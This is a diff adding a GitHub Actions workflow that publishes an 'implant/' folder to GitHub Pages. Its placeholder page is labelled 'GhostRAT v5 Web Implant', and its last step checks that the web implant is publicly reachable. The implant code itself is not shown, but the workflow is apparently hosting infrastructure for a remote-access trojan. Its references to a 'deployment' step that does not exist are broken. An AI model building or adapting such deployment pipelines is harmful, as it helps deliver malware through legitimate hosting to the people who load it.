@@ -1,0 +1,49 @@
+name: Deploy Pages
+
+on:
+  push:
+    branches: [main]
+    paths:
+      - 'implant/**'
+  workflow_dispatch:
+
+permissions:
+  pages: write
+  id-token: write
+  contents: read
+
+concurrency:
+  group: "pages"
+  cancel-in-progress: false
+
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    environment:
+      name: github-pages
+      url: ${{ steps.deployment.outputs.page_url }}
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      - name: Ensure implant directory exists
+        run: |
+          mkdir -p implant
+          if [ ! -f implant/implant.html ]; then
+            echo '<html><body><h1>GhostRAT v5 Web Implant</h1><p>Deploy implant files to the implant/ directory.</p></body></html>' > implant/index.html
+          fi
+
+      - name: Setup GitHub Pages
+        uses: actions/configure-pages@v5
+
+      - name: Deploy to GitHub Pages
+        uses: peaceiris/actions-gh-pages@v3
+        with:
+          github_token: ${{ secrets.GITHUB_TOKEN }}
+          publish_dir: ./implant
+          keep_files: true
+
+      - name: Verify deployment
+        run: |
+          echo "GitHub Pages deployed to: ${{ steps.deployment.outputs.page_url }}"
+          echo "Check the URL to confirm the web implant is accessible."
